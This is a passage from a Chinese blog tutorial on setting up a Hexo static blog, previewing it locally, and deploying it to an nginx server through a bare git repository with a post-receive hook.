<pre><code>hexo init $PATH/$DIR
</code></pre>
<p>这里$+大写的都是用户自己定义的部分(后文同上),用于选择hexo存放在本地的位置</p>
<p>我们先不管服务端的配置,先在本地测试一下.刚才在init的时候hexo已经为我们自动生成了一篇hello-world文章,类似如下</p>
<pre><code>---
title: Hello World
comments: true
---

#接下来是正文......
</code></pre>
<p>当然,一篇文章可以定义许多属性,只要写在”—“之间就可以,这里我也是在学习,就不班门弄斧了.相信大家也很容易见文知意.如果想要自己创建一篇文章,只需要使用</p>
<pre><code>hexo new $ARTICLE_NAME
</code></pre>
<p>这里我们创建了一篇博文,使用new命令,是不是很简单</p>
<p>接着我们需要安装一些软件来将我们写好的md文章转换成html等文件</p>
<pre><code>npm hexo-deployer-git --save
</code></pre>
<p>见证奇迹的时刻!!!</p>
<p>执行:</p>
<pre><code>hexo g &amp;&amp; hexo s
</code></pre>
<p>打开你的浏览器,输入127.0.0.1:4000,是不是看到了一篇简单的hello-world.其实刚才的第一个命令用于生成静态的文件,第二个命令开启了一个侦听于本地4000端口的服务程序,将刚生成好的静态文本展示了出来,就是这么的简单.</p>
<h2 id="1-3-服务端的搭建"><a href="#1-3-服务端的搭建" class="headerlink" title="1.3 服务端的搭建"></a>1.3 服务端的搭建</h2><p>接下来在服务器端,我们需要搭建nginx服务</p>
<pre><code>apt-get install nginx git
</code></pre>
<p>git用处很多,这里用于创建一个仓库</p>
<p>先创建一个裸仓库</p>
<pre><code>mkdir /var/$WEB
chown -R $USER:$USER /var/$WEB
chmod -R 755 /var/$WEB
</code></pre>
<p>我们在var下创建了一个目录,用来作为仓库.然后修改所属和权限,使$USER拥有相应的权限,然后创建仓库:</p>
<pre><code>cd /var/$WEB
git init --bare $GIT_NAME.git
</code></pre>
<p>接下来配置nginx托管文件目录,并修改相应权限</p>
<pre><code>mkdir -p /var/www/$HEXO
chown -R $USER:$USER /var/www/$HEXO
chmod -R 755 /var/www/$HEXO
</code></pre>
<p>修改nginx的配置:</p>
<pre><code>vim /etc/nginx/sites-available/default
</code></pre>
<p>将nginx根目录修改为托管文件目录</p>
<pre><code>......
server &#123;
listen 80 default_server;
listen [::]:80 default_server;

root /var/www/$HEXO; # 需要修改的部分
......
</code></pre>
<p>保存退出,并重启nginx</p>
<pre><code>systemctl restart nginx
</code></pre>
<h2 id="1-4-创建git钩子"><a href="#1-4-创建git钩子" class="headerlink" title="1.4 创建git钩子"></a>1.4 创建git钩子</h2><p>接下来，在服务器上的裸仓库 $WEB 创建一个钩子，在满足特定条件时将静态 html 文件传送到 Web 服务器的目录下，即 &#x2F;var&#x2F;www&#x2F;$HEXO.</p>
<pre><code>vim /var/$WEB/$GIT_NAME.git/hooks/post-receive
</code></pre>
<p>在该文件中添加两行代码，指定 git 的工作树(源代码)和 git 目录(配置文件等).</p>
<pre><code>#!/bin/bash
git --work-tree=/var/www/$HEXO --git-dir=/var/$WEB/$GIT_NAME.git checkout -f
</code></pre>
<p>保存并退出文件，并让该文件变为可执行文件</p>
<pre><code>chmod +x /var/$WEB/$GIT_NAME.git/hooks/post-receive
</code></pre>
<p>到这里,服务端的配置基本结束</p>
<p>运行以下命令,你应该就可以通过访问服务器看到自己的博客了</p>
<pre><code>hexo g &amp;&amp; hexo d
</code></pre>
<p>期间还会要求你输入服务器登录密码</p>
<p>是不是很开森呢.</p>
<p>接下来我们可以自由选择对我们的博客进行下面的一些完善,比如更换更酷的主题,将站点更换为https,为博客添加评论系统等,这里就不展开了.</p>
-->
      
    </div>
    <footer class="article-footer">
      <!--<a data-url="https://rock718.github.io.git/2017/07/11/hexo_build/" data-id="cl9y4cx9j001p24fybpm3bcd0" class="article-share-link">Share</a>-->
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
  </nav>

</section>
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 Rock<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> with 
      theme_by <a href="http://hexo.io/" target="_blank">mango</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives/" class="mobile-nav-link">Archives</a>
  
    <a href="/about/" class="mobile-nav-link">about</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>